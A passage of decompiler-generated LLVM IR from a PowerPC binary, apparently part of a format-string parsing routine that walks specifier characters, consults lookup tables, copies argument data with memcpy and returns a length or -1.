  %v0_10009348 = phi i32 [ %v0_10009318, %dec_label_pc_100090dc ], [ %v1_10009318, %dec_label_pc_10009318 ]
  %v2_1000932c = sub i32 %v0_10009348, ptrtoint ([9 x i8]* @global_var_10011b4c.302 to i32)
  store i32 %v2_1000932c, i32* %r9.global-to-local, align 4
  %v2_10009330 = icmp sgt i32 %v2_1000932c, 1
  br i1 %v2_10009330, label %dec_label_pc_10009350, label %dec_label_pc_10009338

dec_label_pc_10009338:                            ; preds = %dec_label_pc_10009324
  %v1_10009338 = inttoptr i32 %v0_1000934c to i8*
  %v2_10009338 = load i8, i8* %v1_10009338, align 1
  %v3_10009338 = zext i8 %v2_10009338 to i32
  store i32 %v3_10009338, i32* %r0.global-to-local, align 4
  %v1_1000933c = inttoptr i32 %v0_10009348 to i8*
  %v2_1000933c = load i8, i8* %v1_1000933c, align 1
  %v3_1000933c = zext i8 %v2_1000933c to i32
  store i32 %v3_1000933c, i32* %r9.global-to-local, align 4
  %v4_10009340 = icmp eq i8 %v2_10009338, %v2_1000933c
  br i1 %v4_10009340, label %dec_label_pc_10009348, label %dec_label_pc_10009350

dec_label_pc_10009348:                            ; preds = %dec_label_pc_10009338
  %v1_10009348 = add i32 %v0_10009348, 9
  store i32 %v1_10009348, i32* %r11.global-to-local, align 4
  %v1_1000934c = add i32 %v0_1000934c, 1
  store i32 %v1_1000934c, i32* @r30, align 4
  br label %dec_label_pc_10009350

dec_label_pc_10009350:                            ; preds = %dec_label_pc_10009338, %dec_label_pc_10009324, %dec_label_pc_10009348
  %v0_10009354 = phi i32 [ %v0_10009348, %dec_label_pc_10009338 ], [ %v0_10009348, %dec_label_pc_10009324 ], [ %v1_10009348, %dec_label_pc_10009348 ]
  %v0_10009350 = phi i32 [ %v0_1000934c, %dec_label_pc_10009338 ], [ %v0_1000934c, %dec_label_pc_10009324 ], [ %v1_1000934c, %dec_label_pc_10009348 ]
  %v1_10009350 = inttoptr i32 %v0_10009350 to i8*
  %v2_10009350 = load i8, i8* %v1_10009350, align 1
  %v3_10009350 = zext i8 %v2_10009350 to i32
  store i32 %v3_10009350, i32* @r7, align 4
  %v1_10009354 = add i32 %v0_10009354, 9
  %v2_10009354 = inttoptr i32 %v1_10009354 to i8*
  %v3_10009354 = load i8, i8* %v2_10009354, align 1
  %v4_10009354 = zext i8 %v3_10009354 to i32
  store i32 %v4_10009354, i32* %r0.global-to-local, align 4
  %v3_10009358 = icmp eq i8 %v2_10009350, 0
  %v1_1000935c = mul nuw nsw i32 %v4_10009354, 256
  store i32 %v1_1000935c, i32* %r10.global-to-local, align 4
  br i1 %v3_10009358, label %dec_label_pc_10009594, label %dec_label_pc_10009364

dec_label_pc_10009364:                            ; preds = %dec_label_pc_10009350
  %v1_10009368 = and i32 %v1_1000935c, 1024
  store i32 %v1_10009368, i32* %r0.global-to-local, align 4
  %v3_10009368 = icmp eq i32 %v1_10009368, 0
  store i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32* %r3.global-to-local, align 4
  %v3_10009374 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_10009374, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011b80.304 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10011b8c.303 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009384

dec_label_pc_10009384:                            ; preds = %dec_label_pc_100093e8, %dec_label_pc_10009364
  %v1_10009390 = phi i32 [ %v1_100093e8, %dec_label_pc_100093e8 ], [ ptrtoint ([21 x i8]* @global_var_10011b8c.303 to i32), %dec_label_pc_10009364 ]
  %v1_10009384 = inttoptr i32 %v1_10009390 to i8*
  %v2_10009384 = load i8, i8* %v1_10009384, align 1
  %v3_10009384 = zext i8 %v2_10009384 to i32
  store i32 %v3_10009384, i32* %r0.global-to-local, align 4
  %v4_10009388 = icmp eq i8 %v2_10009384, %v2_10009350
  br i1 %v4_10009388, label %dec_label_pc_10009390, label %dec_label_pc_100093e8

dec_label_pc_10009390:                            ; preds = %dec_label_pc_10009384
  %v2_10009390 = sub i32 %v1_10009390, ptrtoint ([21 x i8]* @global_var_10011b8c.303 to i32)
  %tmp61 = icmp slt i32 %v2_10009390, 18
  %brmerge = or i1 %v3_10009368, %tmp61
  br i1 %brmerge, label %dec_label_pc_100093a4, label %dec_label_pc_100093a0

dec_label_pc_100093a0:                            ; preds = %dec_label_pc_10009390
  %v1_100093a0 = add i32 %v2_10009390, -2
  br label %dec_label_pc_100093a4

dec_label_pc_100093a4:                            ; preds = %dec_label_pc_10009390, %dec_label_pc_100093a0
  %storemerge = phi i32 [ %v1_100093a0, %dec_label_pc_100093a0 ], [ %v2_10009390, %dec_label_pc_10009390 ]
  %v0_100093a4 = phi i32 [ %v1_100093a0, %dec_label_pc_100093a0 ], [ %v2_10009390, %dec_label_pc_10009390 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100093a4 = load i32, i32* @r28, align 4
  %v2_100093a4 = add i32 %v1_100093a4, 32
  %v3_100093a4 = inttoptr i32 %v2_100093a4 to i32*
  store i32 %v0_100093a4, i32* %v3_100093a4, align 4
  store i32 ptrtoint (i32* @global_var_10011b7f.305 to i32), i32* %r11.global-to-local, align 4
  %v0_100093b0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100093ac

dec_label_pc_100093ac:                            ; preds = %dec_label_pc_100093ac, %dec_label_pc_100093a4
  %v0_100093ac = phi i32 [ %v1_100093ac, %dec_label_pc_100093ac ], [ ptrtoint (i32* @global_var_10011b7f.305 to i32), %dec_label_pc_100093a4 ]
  %v1_100093ac = add i32 %v0_100093ac, 1
  %v2_100093ac = inttoptr i32 %v1_100093ac to i8*
  %v3_100093ac = load i8, i8* %v2_100093ac, align 1
  %v4_100093ac = zext i8 %v3_100093ac to i32
  store i32 %v4_100093ac, i32* %r0.global-to-local, align 4
  store i32 %v1_100093ac, i32* %r11.global-to-local, align 4
  %v3_100093b0 = icmp sgt i32 %v0_100093b0.pre, %v4_100093ac
  br i1 %v3_100093b0, label %dec_label_pc_100093ac, label %dec_label_pc_100093b8

dec_label_pc_100093b8:                            ; preds = %dec_label_pc_100093ac
  %v0_100093b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_100093b8 = sub i32 %v1_100093ac, %v0_100093b8
  %v1_100093c0 = mul i32 %v2_100093b8, 2
  store i32 %v1_100093c0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011b70.306 to i32), i32* %r9.global-to-local, align 4
  %v2_100093c8 = add i32 %v1_100093c0, ptrtoint (i32* @global_var_10011b70.306 to i32)
  %v3_100093c8 = inttoptr i32 %v2_100093c8 to i16*
  %v4_100093c8 = load i16, i16* %v3_100093c8, align 2
  %v5_100093c8 = sext i16 %v4_100093c8 to i32
  store i32 %v5_100093c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011b60.307 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10011b8c.303 to i32), i32* @r8, align 4
  %v2_100093d8 = add i32 %v1_100093c0, ptrtoint (i32* @global_var_10011b60.307 to i32)
  %v3_100093d8 = inttoptr i32 %v2_100093d8 to i16*
  %v4_100093d8 = load i16, i16* %v3_100093d8, align 2
  %v5_100093d8 = sext i16 %v4_100093d8 to i32
  store i32 %v5_100093d8, i32* %r9.global-to-local, align 4
  %v2_100093dc = or i32 %v5_100093c8, %v1_1000935c
  store i32 %v2_100093dc, i32* %r0.global-to-local, align 4
  %v2_100093e0 = and i32 %v5_100093d8, %v2_100093dc
  store i32 %v2_100093e0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100093f4

dec_label_pc_100093e8:                            ; preds = %dec_label_pc_10009384
  %v1_100093e8 = add i32 %v1_10009390, 1
  %v2_100093e8 = inttoptr i32 %v1_100093e8 to i8*
  %v3_100093e8 = load i8, i8* %v2_100093e8, align 1
  %v4_100093e8 = zext i8 %v3_100093e8 to i32
  store i32 %v4_100093e8, i32* %r0.global-to-local, align 4
  store i32 %v1_100093e8, i32* @r8, align 4
  %v3_100093ec = icmp eq i8 %v3_100093e8, 0
  br i1 %v3_100093ec, label %dec_label_pc_100093f4, label %dec_label_pc_10009384

dec_label_pc_100093f4:                            ; preds = %dec_label_pc_100093e8, %dec_label_pc_100093b8
  %v0_100093f4 = phi i32 [ %v2_100093e0, %dec_label_pc_100093b8 ], [ %v3_10009374, %dec_label_pc_100093e8 ]
  store i32 %v0_100093f4, i32* %stack_var_-96, align 4
  %v0_100093f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_100093f8 = call i32 @__asm_rlwinm(i32 %v0_100093f8, i32 30, i32 31, i32 31)
  %not.v2_100093fc = icmp eq i32 %v1_100093f8, 0
  %v6_10009400 = sext i1 %not.v2_100093fc to i32
  store i32 %v6_10009400, i32* %r9.global-to-local, align 4
  %v1_10009404 = call i32 @__asm_rlwinm(i32 %v1_1000935c, i32 0, i32 20, i32 23)
  store i32 %v1_10009404, i32* %r0.global-to-local, align 4
  %v1_10009408 = call i32 @__asm_rlwinm(i32 %v6_10009400, i32 0, i32 0, i32 27)
  store i32 %v1_10009408, i32* %r9.global-to-local, align 4
  %v0_1000940c = load i32, i32* @r30, align 4
  %v1_1000940c = inttoptr i32 %v0_1000940c to i8*
  %v2_1000940c = load i8, i8* %v1_1000940c, align 1
  %v3_1000940c = zext i8 %v2_1000940c to i32
  store i32 %v3_1000940c, i32* %r10.global-to-local, align 4
  %v0_10009410 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009410 = call i32 @__asm_rlwinm(i32 %v0_10009410, i32 0, i32 30, i32 28)
  %v1_10009414 = add i32 %v1_10009408, 48
  store i32 %v1_10009414, i32* %r9.global-to-local, align 4
  %v2_10009418 = or i32 %v1_10009410, %v1_10009404
  store i32 %v2_10009418, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_10009420 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009420 = load i32, i32* @r28, align 4
  %v2_10009420 = add i32 %v1_10009420, 12
  %v3_10009420 = inttoptr i32 %v2_10009420 to i32*
  store i32 %v0_10009420, i32* %v3_10009420, align 4
  %v0_10009424 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009424 = load i32, i32* @r28, align 4
  %v2_10009424 = add i32 %v1_10009424, 4
  %v3_10009424 = inttoptr i32 %v2_10009424 to i32*
  store i32 %v0_10009424, i32* %v3_10009424, align 4
  %v0_10009428 = load i32, i32* @r31, align 4
  %v1_10009428 = load i32, i32* @r28, align 4
  %v2_10009428 = add i32 %v1_10009428, 8
  %v3_10009428 = inttoptr i32 %v2_10009428 to i32*
  store i32 %v0_10009428, i32* %v3_10009428, align 4
  %v0_1000942c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000942c = load i32, i32* @r28, align 4
  %v2_1000942c = add i32 %v1_1000942c, 20
  %v3_1000942c = inttoptr i32 %v2_1000942c to i32*
  store i32 %v0_1000942c, i32* %v3_1000942c, align 4
  %v0_10009430 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009430 = load i32, i32* @r28, align 4
  %v2_10009430 = add i32 %v1_10009430, 16
  %v3_10009430 = inttoptr i32 %v2_10009430 to i32*
  store i32 %v0_10009430, i32* %v3_10009430, align 4
  %v0_10009434 = load i32, i32* @r7, align 4
  %v1_10009434 = load i32, i32* @r28, align 4
  %v2_10009434 = add i32 %v1_10009434, 28
  %v3_10009434 = inttoptr i32 %v2_10009434 to i32*
  store i32 %v0_10009434, i32* %v3_10009434, align 4
  %v0_10009438 = load i32, i32* @r8, align 4
  %v1_10009438 = inttoptr i32 %v0_10009438 to i8*
  %v2_10009438 = load i8, i8* %v1_10009438, align 1
  %v3_10009438 = zext i8 %v2_10009438 to i32
  store i32 %v3_10009438, i32* %r9.global-to-local, align 4
  %v3_1000943c = icmp eq i8 %v2_10009438, 0
  br i1 %v3_1000943c, label %dec_label_pc_10009444, label %dec_label_pc_1000945c

dec_label_pc_10009444:                            ; preds = %dec_label_pc_100093f4
  %v0_10009444 = load i32, i32* @r30, align 4
  %v1_10009444 = inttoptr i32 %v0_10009444 to i8*
  %v2_10009444 = load i8, i8* %v1_10009444, align 1
  %v3_10009444 = zext i8 %v2_10009444 to i32
  store i32 %v3_10009444, i32* %r0.global-to-local, align 4
  %v3_10009448 = icmp eq i8 %v2_10009444, 109
  br i1 %v3_10009448, label %dec_label_pc_10009450, label %dec_label_pc_10009594

dec_label_pc_10009450:                            ; preds = %dec_label_pc_10009444
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10009454 = load i32, i32* @r28, align 4
  %v2_10009454 = add i32 %v1_10009454, 28
  %v3_10009454 = inttoptr i32 %v2_10009454 to i32*
  store i32 %v3_10009438, i32* %v3_10009454, align 4
  %v0_10009458 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009458 = load i32, i32* @r28, align 4
  %v2_10009458 = add i32 %v1_10009458, 32
  %v3_10009458 = inttoptr i32 %v2_10009458 to i32*
  store i32 %v0_10009458, i32* %v3_10009458, align 4
  br label %dec_label_pc_1000945c

dec_label_pc_1000945c:                            ; preds = %dec_label_pc_100093f4, %dec_label_pc_10009450
  %v0_1000945c = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000945c, 1
  br i1 %tmp62, label %dec_label_pc_10009538, label %dec_label_pc_10009464

dec_label_pc_10009464:                            ; preds = %dec_label_pc_1000945c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10009468

dec_label_pc_10009468:                            ; preds = %dec_label_pc_10009520, %dec_label_pc_10009464
  %v0_10009490 = phi i32 [ 0, %dec_label_pc_10009464 ], [ %v1_10009524, %dec_label_pc_10009520 ]
  %v2_10009468 = icmp sgt i32 %v0_10009490, 2
  br i1 %v2_10009468, label %dec_label_pc_1000948c, label %dec_label_pc_10009470

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009468
  %v1_10009470 = mul i32 %v0_10009490, 4
  store i32 %v1_10009470, i32* %r0.global-to-local, align 4
  %v0_10009474 = load i32, i32* @r1, align 4
  %v2_10009474 = add i32 %v0_10009474, %v1_10009470
  store i32 %v2_10009474, i32* %r9.global-to-local, align 4
  %v1_10009478 = add i32 %v2_10009474, 20
  %v2_10009478 = inttoptr i32 %v1_10009478 to i32*
  %v3_10009478 = load i32, i32* %v2_10009478, align 4
  store i32 %v3_10009478, i32* %r0.global-to-local, align 4
  %v1_1000947c = load i32, i32* @r28, align 4
  %v2_1000947c = add i32 %v1_1000947c, %v0_10009490
  store i32 %v2_1000947c, i32* %r9.global-to-local, align 4
  %v1_10009480 = urem i32 %v3_10009478, 256
  store i32 %v1_10009480, i32* %r11.global-to-local, align 4
  %v1_10009484 = trunc i32 %v3_10009478 to i8
  %v3_10009484 = add i32 %v2_1000947c, 36
  %v4_10009484 = inttoptr i32 %v3_10009484 to i8*
  store i8 %v1_10009484, i8* %v4_10009484, align 1
  %v0_10009498.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009498

dec_label_pc_1000948c:                            ; preds = %dec_label_pc_10009468
  %v2_10009490 = add i32 %v0_10009490, %stack_var_-84.3
  store i32 %v2_10009490, i32* %r9.global-to-local, align 4
  %v1_10009494 = add i32 %v2_10009490, -2
  store i32 %v1_10009494, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009498

dec_label_pc_10009498:                            ; preds = %dec_label_pc_10009470, %dec_label_pc_1000948c
  %v0_100094b8 = phi i32 [ %v0_10009498.pre, %dec_label_pc_10009470 ], [ %v1_10009494, %dec_label_pc_1000948c ]
  %v1_10009498 = load i32, i32* @r26, align 4
  %v3_10009498 = icmp sgt i32 %v0_100094b8, %v1_10009498
  br i1 %v3_10009498, label %dec_label_pc_100094a0, label %dec_label_pc_100094ac

dec_label_pc_100094a0:                            ; preds = %dec_label_pc_10009498
  %v2_100094a0 = icmp sgt i32 %v0_100094b8, 9
  br i1 %v2_100094a0, label %dec_label_pc_10009594, label %dec_label_pc_100094a8

dec_label_pc_100094a8:                            ; preds = %dec_label_pc_100094a0
  store i32 %v0_100094b8, i32* @r26, align 4
  br label %dec_label_pc_100094ac

dec_label_pc_100094ac:                            ; preds = %dec_label_pc_10009498, %dec_label_pc_100094a8
  store i32 %v2_10009148.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100094b0 = load i32, i32* @r27, align 4
  %v1_100094b0 = mul i32 %v0_100094b0, 4
  store i32 %v1_100094b0, i32* %r0.global-to-local, align 4
  %v2_100094b4 = add i32 %v1_100094b0, %v2_10009148.pre-phi
  %v3_100094b4 = inttoptr i32 %v2_100094b4 to i32*
  %v4_100094b4 = load i32, i32* %v3_100094b4, align 4
  store i32 %v4_100094b4, i32* @r31, align 4
  %v1_100094b8 = add i32 %v0_100094b8, -1
  store i32 %v1_100094b8, i32* @r25, align 4
  %v1_100094bc = mul i32 %v1_100094b8, 4
  %v3_100094c0 = icmp eq i32 %v4_100094b4, 8
  %v1_100094c4 = load i32, i32* @r28, align 4
  %v2_100094c4 = add i32 %v1_100094c4, %v1_100094bc
  store i32 %v2_100094c4, i32* %r9.global-to-local, align 4
  %v1_100094c8 = add i32 %v2_100094c4, 40
  %v2_100094c8 = inttoptr i32 %v1_100094c8 to i32*
  %v3_100094c8 = load i32, i32* %v2_100094c8, align 4
  store i32 %v3_100094c8, i32* %r3.global-to-local, align 4
  br i1 %v3_100094c0, label %dec_label_pc_10009520, label %dec_label_pc_100094d0

dec_label_pc_100094d0:                            ; preds = %dec_label_pc_100094ac
  %v3_100094d0 = icmp eq i32 %v3_100094c8, 8
  br i1 %v3_100094d0, label %dec_label_pc_10009508, label %dec_label_pc_100094d8

dec_label_pc_100094d8:                            ; preds = %dec_label_pc_100094d0
  %v4_100094d8 = icmp eq i32 %v3_100094c8, %v4_100094b4
  br i1 %v4_100094d8, label %dec_label_pc_10009508, label %dec_label_pc_100094e0

dec_label_pc_100094e0:                            ; preds = %dec_label_pc_100094d8
  %v1_100094e0 = call i32 @_promoted_size(i32 %v3_100094c8)
  store i32 %v1_100094e0, i32* @r29, align 4
  %v0_100094e8 = load i32, i32* @r31, align 4
  store i32 %v0_100094e8, i32* %r3.global-to-local, align 4
  %v1_100094ec = call i32 @_promoted_size(i32 %v0_100094e8)
  store i32 %v1_100094ec, i32* %r3.global-to-local, align 4
  %v0_100094f8 = call i32 @__asm_mfcr()
  store i32 %v0_100094f8, i32* %r3.global-to-local, align 4
  store i32 %v0_100094f8, i32* %r0.global-to-local, align 4
  %v1_100094fc = call i32 @__asm_rlwinm(i32 %v0_100094f8, i32 31, i32 31, i32 31)
  store i32 %v1_100094fc, i32* %r0.global-to-local, align 4
  %v3_10009500 = icmp eq i32 %v1_100094fc, 0
  br i1 %v3_10009500, label %dec_label_pc_10009520, label %dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge

dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge: ; preds = %dec_label_pc_100094e0
  %v0_1000950c.pre = load i32, i32* @r27, align 4
  %v0_10009514.pre = load i32, i32* @r25, align 4
  %v1_10009518.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009508

dec_label_pc_10009508:                            ; preds = %dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge, %dec_label_pc_100094d8, %dec_label_pc_100094d0
  %v1_10009518 = phi i32 [ %v1_10009518.pre, %dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge ], [ %v1_100094c4, %dec_label_pc_100094d8 ], [ %v1_100094c4, %dec_label_pc_100094d0 ]
  %v0_10009514 = phi i32 [ %v0_10009514.pre, %dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge ], [ %v1_100094b8, %dec_label_pc_100094d8 ], [ %v1_100094b8, %dec_label_pc_100094d0 ]
  %v0_1000950c = phi i32 [ %v0_1000950c.pre, %dec_label_pc_100094e0.dec_label_pc_10009508_crit_edge ], [ %v0_100094b0, %dec_label_pc_100094d8 ], [ %v0_100094b0, %dec_label_pc_100094d0 ]
  store i32 %v2_10009148.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000950c = mul i32 %v0_1000950c, 4
  store i32 %v1_1000950c, i32* %r0.global-to-local, align 4
  %v2_10009510 = add i32 %v1_1000950c, %v2_10009148.pre-phi
  %v3_10009510 = inttoptr i32 %v2_10009510 to i32*
  %v4_10009510 = load i32, i32* %v3_10009510, align 4
  store i32 %v4_10009510, i32* %r0.global-to-local, align 4
  %v1_10009514 = mul i32 %v0_10009514, 4
  %v2_10009518 = add i32 %v1_10009514, %v1_10009518
  store i32 %v2_10009518, i32* %r9.global-to-local, align 4
  %v2_1000951c = add i32 %v2_10009518, 40
  %v3_1000951c = inttoptr i32 %v2_1000951c to i32*
  store i32 %v4_10009510, i32* %v3_1000951c, align 4
  br label %dec_label_pc_10009520

dec_label_pc_10009520:                            ; preds = %dec_label_pc_100094e0, %dec_label_pc_100094ac, %dec_label_pc_10009508
  %v0_10009520 = load i32, i32* @r28, align 4
  %v1_10009520 = add i32 %v0_10009520, 28
  %v2_10009520 = inttoptr i32 %v1_10009520 to i32*
  %v3_10009520 = load i32, i32* %v2_10009520, align 4
  %v0_10009524 = load i32, i32* @r27, align 4
  %v1_10009524 = add i32 %v0_10009524, 1
  store i32 %v1_10009524, i32* @r27, align 4
  %v1_10009528 = add i32 %v3_10009520, 2
  store i32 %v1_10009528, i32* %r9.global-to-local, align 4
  %v2_1000952c = icmp slt i32 %v1_10009524, %v1_10009528
  br i1 %v2_1000952c, label %dec_label_pc_10009468, label %dec_label_pc_10009550

dec_label_pc_10009538:                            ; preds = %dec_label_pc_1000945c
  %v0_10009538 = load i32, i32* @r28, align 4
  %v1_10009538 = add i32 %v0_10009538, 28
  %v2_10009538 = inttoptr i32 %v1_10009538 to i32*
  %v3_10009538 = load i32, i32* %v2_10009538, align 4
  store i32 %v3_10009538, i32* %r5.global-to-local, align 4
  %v1_1000953c = add i32 %v0_10009538, 40
  store i32 %v1_1000953c, i32* @r3, align 4
  %v0_10009540 = load i32, i32* @r7, align 4
  %v1_10009540 = trunc i32 %v0_10009540 to i8
  %v3_10009540 = add i32 %v0_10009538, 38
  %v4_10009540 = inttoptr i32 %v3_10009540 to i8*
  store i8 %v1_10009540, i8* %v4_10009540, align 1
  %v2_10009544 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10009544, i32* @r4, align 4
  %v0_10009548 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009548 = mul i32 %v0_10009548, 4
  store i32 %v1_10009548, i32* @r5, align 4
  store i32 268473680, i32* @lr, align 4
  %v0_1000954c = call i32 @memcpy()
  store i32 %v0_1000954c, i32* %r3.global-to-local, align 4
  %v0_10009550.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009550

dec_label_pc_10009550:                            ; preds = %dec_label_pc_10009520, %dec_label_pc_10009538
  %v0_10009550 = phi i32 [ %v0_10009550.pre, %dec_label_pc_10009538 ], [ %v0_10009520, %dec_label_pc_10009520 ]
  %v1_10009550 = add i32 %v0_10009550, 16
  %v2_10009550 = inttoptr i32 %v1_10009550 to i32*
  %v3_10009550 = load i32, i32* %v2_10009550, align 4
  store i32 %v3_10009550, i32* %r0.global-to-local, align 4
  %v0_10009554 = load i32, i32* @r26, align 4
  %v2_10009554 = add i32 %v0_10009550, 24
  %v3_10009554 = inttoptr i32 %v2_10009554 to i32*
  store i32 %v0_10009554, i32* %v3_10009554, align 4
  %v0_10009558 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009558 = and i32 %v0_10009558, 128
  store i32 %v1_10009558, i32* %r9.global-to-local, align 4
  %v3_10009558 = icmp eq i32 %v1_10009558, 0
  br i1 %v3_10009558, label %dec_label_pc_10009560, label %dec_label_pc_1000956c

dec_label_pc_10009560:                            ; preds = %dec_label_pc_10009550
  %v0_10009560 = load i32, i32* @r30, align 4
  %v1_10009560 = add i32 %v0_10009560, 1
  store i32 %v1_10009560, i32* %r0.global-to-local, align 4
  %v1_10009564 = load i32, i32* @r28, align 4
  %v2_10009564 = inttoptr i32 %v1_10009564 to i32*
  store i32 %v1_10009560, i32* %v2_10009564, align 4
  br label %dec_label_pc_10009584

dec_label_pc_1000956c:                            ; preds = %dec_label_pc_10009550
  %v2_1000956c = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000956c, i32* %r0.global-to-local, align 4
  %v0_10009570 = load i32, i32* @r28, align 4
  %v1_10009570 = inttoptr i32 %v0_10009570 to i32*
  %v2_10009570 = load i32, i32* %v1_10009570, align 4
  %v1_10009574 = load i32, i32* @r30, align 4
  %v2_10009574 = sub i32 %v1_10009574, %v2_1000956c
  %v1_10009578 = mul i32 %v2_10009574, 4
  store i32 %v1_10009578, i32* %r0.global-to-local, align 4
  %v2_1000957c = add i32 %v1_10009578, %v2_10009570
  store i32 %v2_1000957c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000957c, i32* %v1_10009570, align 4
  br label %dec_label_pc_10009584

dec_label_pc_10009584:                            ; preds = %dec_label_pc_10009560, %dec_label_pc_1000956c
  %v0_10009584 = load i32, i32* @r28, align 4
  %v1_10009584 = add i32 %v0_10009584, 28
  %v2_10009584 = inttoptr i32 %v1_10009584 to i32*
  %v3_10009584 = load i32, i32* %v2_10009584, align 4
  store i32 %v3_10009584, i32* %r9.global-to-local, align 4
  %v1_10009588 = add i32 %v3_10009584, 2
  br label %dec_label_pc_10009594

dec_label_pc_10009594:                            ; preds = %dec_label_pc_100090f8, %dec_label_pc_100091cc, %dec_label_pc_100092a8, %dec_label_pc_1000929c, %dec_label_pc_100092c4, %dec_label_pc_10009200, %dec_label_pc_100094a0, %dec_label_pc_10009350, %dec_label_pc_10009444, %dec_label_pc_10009584
  %storemerge2 = phi i32 [ %v1_10009588, %dec_label_pc_10009584 ], [ -1, %dec_label_pc_10009444 ], [ -1, %dec_label_pc_10009350 ], [ -1, %dec_label_pc_100094a0 ], [ -1, %dec_label_pc_10009200 ], [ -1, %dec_label_pc_100092c4 ], [ -1, %dec_label_pc_1000929c ], [ -1, %dec_label_pc_100092a8 ], [ -1, %dec_label_pc_100091cc ], [ -1, %dec_label_pc_100090f8 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_10009090, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_10009578, { 1, 0 }
  uselistorder i32 %v0_10009550, { 1, 0 }
  uselistorder i32 %v1_10009524, { 1, 2, 0 }
  uselistorder i32 %v1_1000950c, { 1, 0 }
  uselistorder i32 %v0_100094f8, { 0, 2, 1 }
  uselistorder i32 %v3_100094c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100094c4, { 1, 2, 0 }
  uselistorder i32 %v1_100094b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100094b0, { 1, 0 }
  uselistorder i32 %v0_100094b0, { 1, 2, 0 }
  uselistorder i32 %v3_10009478, { 1, 0, 2 }
  uselistorder i32 %v1_10009470, { 1, 0 }
  uselistorder i32 %v0_10009490, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100093e8, { 1, 2, 0 }
  uselistorder i32 %v1_100093c0, { 2, 1, 0 }
  uselistorder i32 %v1_100093ac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10009390, { 1, 0, 2 }
  uselistorder i32 %v1_1000935c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10009318, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100092dc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100092c8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10009238, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009234, { 1, 0 }
  uselistorder i32 %v0_1000924c, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100091b0, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100091a8, { 1, 0 }
  uselistorder i32 %v1_10009198, { 1, 0 }
  uselistorder i32 %v3_10009190, { 1, 0, 2 }
  uselistorder i32 %v0_1000920c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_100091dc, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000916c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009154, { 1, 0 }
  uselistorder i32 %v2_10009148.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10009128, { 1, 0 }
  uselistorder i32 %v1_10009110, { 1, 2, 0 }
  uselistorder i32 %v0_10009104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
